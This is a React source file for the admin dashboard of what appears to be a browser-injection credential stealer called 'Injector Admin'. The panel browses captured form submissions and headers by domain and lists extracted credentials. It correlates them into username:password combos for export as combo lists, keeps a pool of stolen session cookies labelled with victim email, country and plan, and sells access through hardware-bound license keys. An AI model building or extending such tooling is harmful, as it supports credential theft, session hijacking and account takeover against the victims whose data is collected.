import React, { useState, useEffect } from 'react'
import Login from './Login'
import './App.css'

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [token, setToken] = useState('')
  const [activeTab, setActiveTab] = useState('captures')
  const [captures, setCaptures] = useState([])
  const [credentials, setCredentials] = useState([])
  const [accounts, setAccounts] = useState([])
  const [licenses, setLicenses] = useState([])
  const [cookiePool, setCookiePool] = useState([])
  const [loading, setLoading] = useState(false)
  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0, total_accounts: 0, total_licenses: 0, total_cookies: 0 })
  const [error, setError] = useState(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [typeFilter, setTypeFilter] = useState('ALL')
  const [debouncedSearch, setDebouncedSearch] = useState('')
  const [selectedIds, setSelectedIds] = useState([])
  const [domainFilter, setDomainFilter] = useState('ALL')
  const [availableDomains, setAvailableDomains] = useState([])
  const [domainsLoading, setDomainsLoading] = useState(false)
  const [currentPage, setCurrentPage] = useState(1)
  const [pageSize, setPageSize] = useState(50)
  const [dateFrom, setDateFrom] = useState('')
  const [dateTo, setDateTo] = useState('')
  const [licenseStatusFilter, setLicenseStatusFilter] = useState('')
  const [showCreateLicense, setShowCreateLicense] = useState(false)
  const [newLicenseCount, setNewLicenseCount] = useState(5)
  const [newLicensePrefix, setNewLicensePrefix] = useState('PHC')
  const [copyFeedback, setCopyFeedback] = useState(null)

  const API_BASE = '/v1/admin'

  useEffect(() => {
    const savedToken = localStorage.getItem('admin_api_key')
    if (savedToken) { setToken(savedToken); setIsAuthenticated(true) }
  }, [])

  useEffect(() => { if (isAuthenticated && token) { fetchStats(token); fetchDomains() } }, [isAuthenticated, token])
  useEffect(() => { const t = setTimeout(() => setDebouncedSearch(searchTerm), 500); return () => clearTimeout(t) }, [searchTerm])
  useEffect(() => { setCurrentPage(1) }, [activeTab, typeFilter, debouncedSearch, domainFilter, dateFrom, dateTo, licenseStatusFilter])
  useEffect(() => { if (isAuthenticated) fetchData() }, [activeTab, isAuthenticated, typeFilter, debouncedSearch, domainFilter, currentPage, pageSize, dateFrom, dateTo, licenseStatusFilter])

  const fetchStats = async (authToken) => {
    try {
      const res = await fetch(`${API_BASE}/stats`, { headers: { 'Authorization': `Bearer ${authToken || token}` } })
      if (res.ok) {
        const json = await res.json()
        setStats(prev => ({ ...prev, total_captures: json.total_captures || 0, total_credentials: json.total_credentials || 0, total_accounts: json.total_accounts || 0 }))
      }
      // Fetch license + cookie stats
      const lRes = await fetch(`${API_BASE}/licenses?page_size=1`, { headers: { 'Authorization': `Bearer ${authToken || token}` } })
      if (lRes.ok) { const lj = await lRes.json(); setStats(prev => ({ ...prev, total_licenses: lj.total || 0 })) }
      const cRes = await fetch(`${API_BASE}/cookie-pool/stats`, { headers: { 'Authorization': `Bearer ${authToken || token}` } })
      if (cRes.ok) { const cj = await cRes.json(); setStats(prev => ({ ...prev, total_cookies: cj.total || 0 })) }
    } catch (err) { console.error('Stats fetch failed:', err) }
  }

  const fetchData = async () => {
    setLoading(true); setError(null)
    try {
      let endpoint = ''
      if (activeTab === 'captures') endpoint = '/captures'
      else if (activeTab === 'credentials') endpoint = '/credentials'
      else if (activeTab === 'accounts') endpoint = '/accounts'
      else if (activeTab === 'licenses') endpoint = '/licenses'
      else if (activeTab === 'cookies') endpoint = '/cookie-pool'

      const queryParams = new URLSearchParams({ page: currentPage, page_size: pageSize })

      if (activeTab === 'captures' || activeTab === 'credentials') {
        queryParams.set('capture_type', typeFilter)
        queryParams.set('search', debouncedSearch)
        if (domainFilter !== 'ALL') queryParams.set('domain', domainFilter)
      }
      if (activeTab === 'accounts' && domainFilter !== 'ALL') queryParams.set('domain', domainFilter)
      if (activeTab === 'accounts') queryParams.set('search', debouncedSearch)
      if (activeTab === 'licenses') {
        if (debouncedSearch) queryParams.set('search', debouncedSearch)
        if (licenseStatusFilter) queryParams.set('status_filter', licenseStatusFilter)
      }
      if (activeTab === 'cookies' && debouncedSearch) queryParams.set('search', debouncedSearch)

      const res = await fetch(`${API_BASE}${endpoint}?${queryParams}`, { headers: { 'Authorization': `Bearer ${token}` } })
      if (res.status === 401) { handleLogout(); return }
      if (!res.ok) throw new Error(`Server returned ${res.status}: ${res.statusText}`)

      const json = await res.json()

      if (activeTab === 'captures') { setCaptures(json.data || []); setStats(prev => ({ ...prev, total_captures: json.total || 0 })) }
      else if (activeTab === 'credentials') { setCredentials(json.data || []); setStats(prev => ({ ...prev, total_credentials: json.total || 0 })) }
      else if (activeTab === 'accounts') { setAccounts(json.data || []); setStats(prev => ({ ...prev, total_accounts: json.total || 0 })) }
      else if (activeTab === 'licenses') { setLicenses(json.data || []); setStats(prev => ({ ...prev, total_licenses: json.total || 0 })) }
      else if (activeTab === 'cookies') { setCookiePool(json.data || []); setStats(prev => ({ ...prev, total_cookies: json.total || 0 })) }

      setSelectedIds([])
      fetchStats()
    } catch (err) { console.error('Fetch error:', err); setError(err.message) }
    finally { setLoading(false) }
  }

  const fetchDomains = async () => {
    setDomainsLoading(true)
    try {
      const res = await fetch(`${API_BASE}/domains`, { headers: { 'Authorization': `Bearer ${token}` } })
      if (res.ok) { const json = await res.json(); setAvailableDomains(json.domains || []) }
    } catch (err) { console.error('Failed to fetch domains:', err) }
    finally { setDomainsLoading(false) }
  }

  // --- Actions ---
  const handleSelectAll = (e) => {
    if (e.target.checked) {
      const ids = activeTab === 'captures' ? captures.map(c => c.id) :
        activeTab === 'licenses' ? licenses.map(l => l.id) :
          activeTab === 'cookies' ? cookiePool.map(c => c.id) : []
      setSelectedIds(ids)
    } else setSelectedIds([])
  }

  const handleSelectOne = (id) => {
    setSelectedIds(prev => prev.includes(id) ? prev.filter(i => i !== id) : [...prev, id])
  }

  const handleBulkDelete = async () => {
    if (!window.confirm(`Delete ${selectedIds.length} selected items?`)) return
    setLoading(true)
    try {
      let endpoint = ''
      if (activeTab === 'captures') endpoint = '/captures/bulk-delete'
      else if (activeTab === 'cookies') endpoint = '/cookie-pool/bulk-delete'
      else return

      await fetch(`${API_BASE}${endpoint}`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ ids: selectedIds })
      })
      fetchData()
    } catch (err) { alert('Bulk delete failed') }
    finally { setLoading(false) }
  }

  const handleDelete = async (id) => {
    if (!window.confirm('Delete this item?')) return
    try {
      let endpoint = ''
      if (activeTab === 'captures') endpoint = `/captures/${id}`
      else if (activeTab === 'licenses') endpoint = `/licenses/${id}`
      else if (activeTab === 'cookies') endpoint = `/cookie-pool/${id}`
      else return

      await fetch(`${API_BASE}${endpoint}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } })
      fetchData()
    } catch (err) { alert('Delete failed') }
  }

  const handleCopy = (text, label) => {
    navigator.clipboard.writeText(text)
    setCopyFeedback(label || 'Copied!')
    setTimeout(() => setCopyFeedback(null), 1500)
  }

  // License actions
  const handleCreateLicenses = async () => {
    setLoading(true)
    try {
      const res = await fetch(`${API_BASE}/licenses`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ prefix: newLicensePrefix, count: newLicenseCount })
      })
      if (res.ok) {
        const json = await res.json()
        alert(`Created ${json.created} license keys!`)
        setShowCreateLicense(false)
        fetchData()
      } else alert('Failed to create licenses')
    } catch (err) { alert('Error: ' + err.message) }
    finally { setLoading(false) }
  }

  const handleToggleLicense = async (id, currentActive) => {
    try {
      await fetch(`${API_BASE}/licenses/${id}`, {
        method: 'PATCH',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ is_active: !currentActive })
      })
      fetchData()
    } catch (err) { alert('Failed to update license') }
  }

  const handleResetHwid = async (id) => {
    if (!window.confirm('Reset hardware binding? The key can be used on a new device.')) return
    try {
      await fetch(`${API_BASE}/licenses/${id}`, {
        method: 'PATCH',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ hardware_id: "" })
      })
      fetchData()
    } catch (err) { alert('Failed to reset HWID') }
  }

  const handleExportByDomain = async (domain) => {
    try {
      const params = new URLSearchParams()
      if (domain && domain !== 'ALL') params.set('domain', domain)
      const res = await fetch(`${API_BASE}/accounts/export?${params}`, { headers: { 'Authorization': `Bearer ${token}` } })
      if (!res.ok) { alert('Export failed'); return }
      const text = await res.text()
      if (!text.trim()) { alert('No accounts found.'); return }
      const blob = new Blob([text], { type: 'text/plain' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      const suffix = domain && domain !== 'ALL' ? `_${domain.replace(/[^a-z0-9]/gi, '_')}` : '_all'
      a.download = `combos${suffix}_${new Date().toISOString().split('T')[0]}.txt`
      document.body.appendChild(a); a.click(); document.body.removeChild(a)
      URL.revokeObjectURL(url)
    } catch (err) { alert('Export failed: ' + err.message) }
  }

  const handlePurgeData = async () => {
    const confirmKey = window.prompt('CRITICAL: Enter your ADMIN API KEY to confirm purge:')
    if (!confirmKey || confirmKey !== token) { alert('Verification Failed.'); return }
    if (!window.confirm('FINAL WARNING: Delete ALL data?')) return
    setLoading(true)
    try {
      await fetch(`/v1/admin/purge`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } })
      fetchData(); alert('Database purged.')
    } catch (err) { alert('Purge failed') }
    finally { setLoading(false) }
  }

  const handleLogin = (key) => { setToken(key); setIsAuthenticated(true) }
  const handleLogout = () => { localStorage.removeItem('admin_api_key'); setToken(''); setIsAuthenticated(false) }

  const currentTotal = activeTab === 'captures' ? stats.total_captures :
    activeTab === 'credentials' ? stats.total_credentials :
      activeTab === 'accounts' ? stats.total_accounts :
        activeTab === 'licenses' ? stats.total_licenses :
          stats.total_cookies
  const totalPages = Math.max(1, Math.ceil(currentTotal / pageSize))

  if (!isAuthenticated) return <Login onLogin={handleLogin} />

  return (
    <div className="layout">
      <aside className="sidebar glass">
        <div className="logo"><div className="logo-icon">NI</div><span>Injector Admin</span></div>
        <nav>
          <button className={activeTab === 'captures' ? 'active' : ''} onClick={() => setActiveTab('captures')}>📋 Audit Captures</button>
          <button className={activeTab === 'credentials' ? 'active' : ''} onClick={() => setActiveTab('credentials')}>🔑 Extracted Data</button>
          <button className={activeTab === 'accounts' ? 'active' : ''} onClick={() => setActiveTab('accounts')}>👤 Smart Accounts</button>
          <button className={activeTab === 'licenses' ? 'active' : ''} onClick={() => setActiveTab('licenses')}>🎫 Licenses</button>
          <button className={activeTab === 'cookies' ? 'active' : ''} onClick={() => setActiveTab('cookies')}>🍪 Cookie Pool</button>
        </nav>
        <div className="sidebar-stats">
          <div className="stat-item"><label>Captures</label><span>{stats.total_captures.toLocaleString()}</span></div>
          <div className="stat-item"><label>Credentials</label><span>{stats.total_credentials.toLocaleString()}</span></div>
          <div className="stat-item"><label>Accounts</label><span>{stats.total_accounts.toLocaleString()}</span></div>
          <div className="stat-item"><label>Licenses</label><span>{stats.total_licenses.toLocaleString()}</span></div>
          <div className="stat-item"><label>Cookie Pool</label><span>{stats.total_cookies.toLocaleString()}</span></div>
          <button className="logout-btn" onClick={handleLogout}>Disconnect</button>
        </div>
      </aside>

      <main className="content">
        <header className="content-header">
          <h1>
            {activeTab === 'captures' ? 'Audit Logs' : activeTab === 'credentials' ? 'Credential Extraction' :
              activeTab === 'accounts' ? 'Smart Account Correlation' : activeTab === 'licenses' ? 'License Management' : 'Cookie Pool'}
          </h1>
          <div className="header-actions">
            {(activeTab === 'accounts' || activeTab === 'captures' || activeTab === 'credentials') && (
              <select className="domain-select" value={domainFilter} onChange={(e) => setDomainFilter(e.target.value)} disabled={domainsLoading}>
                <option value="ALL">🌐 All Domains</option>
                {availableDomains.map(d => <option key={d} value={d}>{d}</option>)}
              </select>
            )}
            {activeTab === 'accounts' && (
              <button className="export-btn" onClick={() => handleExportByDomain(domainFilter)}>📥 Export</button>
            )}
            {activeTab === 'licenses' && (
              <button className="export-btn" onClick={() => setShowCreateLicense(!showCreateLicense)}>➕ Create Keys</button>
            )}
            <button className="refresh-btn" onClick={fetchData}>Refresh</button>
          </div>
        </header>

        {/* Filter Bar */}
        <section className="filter-bar glass">
          <div className="search-box">
            <input type="text" placeholder={activeTab === 'licenses' ? 'Search key or HWID...' : activeTab === 'cookies' ? 'Search email or description...' : 'Search domain or URL...'} value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
          </div>
          {(activeTab === 'captures' || activeTab === 'credentials') && (
            <div className="type-filter">
              <select value={typeFilter} onChange={(e) => setTypeFilter(e.target.value)}>
                <option value="ALL">All Events</option>
                <option value="FORM_SUBMIT">Credentials</option>
                <option value="HTTP_REQUEST">Network</option>
                <option value="HEADER_CAPTURE">Cookies</option>
                <option value="G100">Snapshots</option>
              </select>
            </div>
          )}
          {activeTab === 'licenses' && (
            <div className="type-filter">
              <select value={licenseStatusFilter} onChange={(e) => setLicenseStatusFilter(e.target.value)}>
                <option value="">All</option>
                <option value="active">Active</option>
                <option value="inactive">Inactive</option>
                <option value="bound">Bound</option>
                <option value="unbound">Unbound</option>
              </select>
            </div>
          )}
        </section>

        {/* Create License Modal */}
        {showCreateLicense && (
          <div className="bulk-actions animate-fade" style={{ background: 'rgba(63,177,255,0.1)', borderColor: 'rgba(63,177,255,0.3)' }}>
            <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>
              <input type="text" value={newLicensePrefix} onChange={(e) => setNewLicensePrefix(e.target.value)} style={{ width: '80px', padding: '6px 10px', background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '6px', color: '#fff' }} placeholder="Prefix" />
              <input type="number" value={newLicenseCount} onChange={(e) => setNewLicenseCount(parseInt(e.target.value) || 1)} min={1} max={50} style={{ width: '60px', padding: '6px 10px', background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '6px', color: '#fff' }} />
              <span style={{ color: '#8b949e', fontSize: '0.85rem' }}>keys</span>
            </div>
            <button className="refresh-btn" onClick={handleCreateLicenses}>Generate</button>
          </div>
        )}

        {/* Bulk Actions */}
        {selectedIds.length > 0 && (activeTab === 'captures' || activeTab === 'cookies') && (
          <div className="bulk-actions animate-fade">
            <span className="selection-info">{selectedIds.length} selected</span>
            <button className="bulk-delete-btn" onClick={handleBulkDelete}>Delete Selected</button>
          </div>
        )}

        {/* Copy Feedback Toast */}
        {copyFeedback && <div className="copy-toast animate-fade">{copyFeedback}</div>}

        {error && <div className="error-banner animate-fade">⚠️ <strong>Error:</strong> {error}</div>}

        {loading ? <div className="loader">Loading...</div> : (
          <div className="data-view animate-fade">

            {/* CAPTURES TAB */}
            {activeTab === 'captures' && (captures.length === 0 ? <div className="empty-state">No captures found.</div> : (
              <table className="admin-table">
                <thead><tr>
                  <th width="40"><input type="checkbox" onChange={handleSelectAll} checked={selectedIds.length === captures.length && captures.length > 0} /></th>
                  <th>Time</th><th>Type</th><th>Domain</th><th>URL</th><th>Actions</th>
                </tr></thead>
                <tbody>{captures.map(c => (
                  <tr key={c.id} className={selectedIds.includes(c.id) ? 'row-selected' : ''}>
                    <td><input type="checkbox" checked={selectedIds.includes(c.id)} onChange={() => handleSelectOne(c.id)} /></td>
                    <td className="dim">{new Date(c.timestamp).toLocaleString()}</td>
                    <td><span className={`badge ${c.capture_type}`}>{c.capture_type}</span></td>
                    <td className="bold">{c.domain}</td>
                    <td className="dim truncate">{c.url}</td>
                    <td><button className="delete-btn" onClick={() => handleDelete(c.id)}>Delete</button></td>
                  </tr>
                ))}</tbody>
              </table>
            ))}

            {/* CREDENTIALS TAB */}
            {activeTab === 'credentials' && (credentials.length === 0 ? <div className="empty-state">No credentials found.</div> : (
              <div className="creds-grid">{credentials.map(cr => (
                <div key={cr.id} className="cred-card glass">
                  <div className="cred-header">
                    <span className="cred-domain">{cr.domain}</span>
                    <span className="cred-time">{new Date(cr.timestamp).toLocaleDateString()}</span>
                  </div>
                  <div className="cred-body">
                    <div className="field"><label>{cr.field_name}</label><div className="value">{cr.field_value}</div></div>
                  </div>
                  <div className="cred-footer">
                    <span className="cred-type">{cr.capture_type}</span>
                    <button className="copy-btn-sm" onClick={() => handleCopy(cr.field_value, `Copied ${cr.field_name}`)}>📋 Copy</button>
                    <button className="copy-btn-sm" onClick={() => handleCopy(`Cookie: ${cr.field_name}=${cr.field_value}`, 'Copied as header')}>🍪 Header</button>
                  </div>
                </div>
              ))}</div>
            ))}

            {/* ACCOUNTS TAB */}
            {activeTab === 'accounts' && (accounts.length === 0 ? <div className="empty-state">No accounts found.</div> : (
              <div className="accounts-grid">{accounts.map(acc => (
                <div key={acc.id || acc.capture_id} className={`account-card glass animate-fade ${acc.is_high_confidence ? 'high-confidence' : ''}`}>
                  <div className="account-header">
                    <div className="domain-stack">
                      <span className="account-domain">{acc.domain}</span>
                      {acc.is_high_confidence && <span className="conf-badge">Verified</span>}
                    </div>
                    <div className="account-meta">
                      <span className="capture-count">{acc.capture_count}x</span>
                      <span className="account-time">{new Date(acc.last_seen).toLocaleDateString()}</span>
                    </div>
                  </div>
                  <div className="account-combo">
                    <div className="combo-strip">
                      <span className="combo-user">{acc.user}</span><span className="combo-sep">:</span><span className="combo-pass">{acc.password}</span>
                    </div>
                    <button className="copy-combo-btn" onClick={() => handleCopy(`${acc.user}:${acc.password}`, 'Combo copied!')}>📋</button>
                  </div>
                  <div className="account-details">
                    {Object.entries(acc.all_fields || {}).map(([k, v]) => (
                      <div key={k} className="detail-row"><label>{k}:</label><span>{v}</span></div>
                    ))}
                  </div>
                </div>
              ))}</div>
            ))}

            {/* LICENSES TAB */}
            {activeTab === 'licenses' && (licenses.length === 0 ? <div className="empty-state">No licenses found.</div> : (
              <table className="admin-table">
                <thead><tr>
                  <th>Key</th><th>Status</th><th>HWID</th><th>Created</th><th>Expires</th><th>Actions</th>
                </tr></thead>
                <tbody>{licenses.map(l => (
                  <tr key={l.id}>
                    <td><code className="license-key">{l.license_key}</code>
                      <button className="copy-btn-inline" onClick={() => handleCopy(l.license_key, 'Key copied!')}>📋</button>
                    </td>
                    <td><span className={`badge ${l.is_active ? 'active-badge' : 'inactive-badge'}`}>{l.is_active ? 'Active' : 'Inactive'}</span></td>
                    <td className="dim" style={{ maxWidth: '120px', overflow: 'hidden', textOverflow: 'ellipsis' }}>{l.hardware_id || '—'}</td>
                    <td className="dim">{l.created_at ? new Date(l.created_at).toLocaleDateString() : '—'}</td>
                    <td className="dim">{l.expiration_date ? new Date(l.expiration_date).toLocaleDateString() : '∞'}</td>
                    <td style={{ display: 'flex', gap: '4px' }}>
                      <button className={l.is_active ? 'delete-btn' : 'activate-btn'} onClick={() => handleToggleLicense(l.id, l.is_active)}>{l.is_active ? 'Disable' : 'Enable'}</button>
                      {l.hardware_id && <button className="reset-btn" onClick={() => handleResetHwid(l.id)}>Reset</button>}
                      <button className="delete-btn" onClick={() => handleDelete(l.id)}>🗑️</button>
                    </td>
                  </tr>
                ))}</tbody>
              </table>
            ))}

            {/* COOKIE POOL TAB */}
            {activeTab === 'cookies' && (cookiePool.length === 0 ? <div className="empty-state">No cookies in pool.</div> : (
              <table className="admin-table">
                <thead><tr>
                  <th width="40"><input type="checkbox" onChange={handleSelectAll} checked={selectedIds.length === cookiePool.length && cookiePool.length > 0} /></th>
                  <th>ID</th><th>Description</th><th>Actions</th>
                </tr></thead>
                <tbody>{cookiePool.map(c => {
                  const desc = c.description || ''
                  const emailMatch = desc.match(/EMAIL:\s*([^\s|]+)/)
                  const countryMatch = desc.match(/COUNTRY:\s*([^|]+)/)
                  const planMatch = desc.match(/PLAN:\s*([^|]+)/)
                  return (
                    <tr key={c.id} className={selectedIds.includes(c.id) ? 'row-selected' : ''}>
                      <td><input type="checkbox" checked={selectedIds.includes(c.id)} onChange={() => handleSelectOne(c.id)} /></td>
                      <td className="dim">#{c.id}</td>
                      <td>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                          <span className="bold">{emailMatch ? emailMatch[1] : 'No email'}</span>
                          <span className="dim" style={{ fontSize: '0.8rem' }}>
                            {countryMatch ? countryMatch[1].trim() : ''} {planMatch ? `• ${planMatch[1].trim()}` : ''}
                          </span>
                        </div>
                      </td>
                      <td style={{ display: 'flex', gap: '4px' }}>
                        <button className="copy-btn-sm" onClick={() => handleCopy(c.cookies, 'Cookie JSON copied!')}>📋 JSON</button>
                        <button className="delete-btn" onClick={() => handleDelete(c.id)}>🗑️</button>
                      </td>
                    </tr>
                  )
                })}</tbody>
              </table>
            ))}

            {/* PAGINATION */}
            <div className="pagination glass">
              <button onClick={() => setCurrentPage(p => Math.max(1, p - 1))} disabled={currentPage === 1}>‹ Prev</button>
              <span className="page-info">Page {currentPage} of {totalPages} ({currentTotal.toLocaleString()} total)</span>
              <button onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))} disabled={currentPage === totalPages}>Next ›</button>
              <select value={pageSize} onChange={(e) => { setPageSize(Number(e.target.value)); setCurrentPage(1) }}>
                <option value={20}>20</option><option value={50}>50</option><option value={100}>100</option><option value={200}>200</option>
              </select>
            </div>
          </div>
        )}
      </main>
    </div>
  )
}

export default App
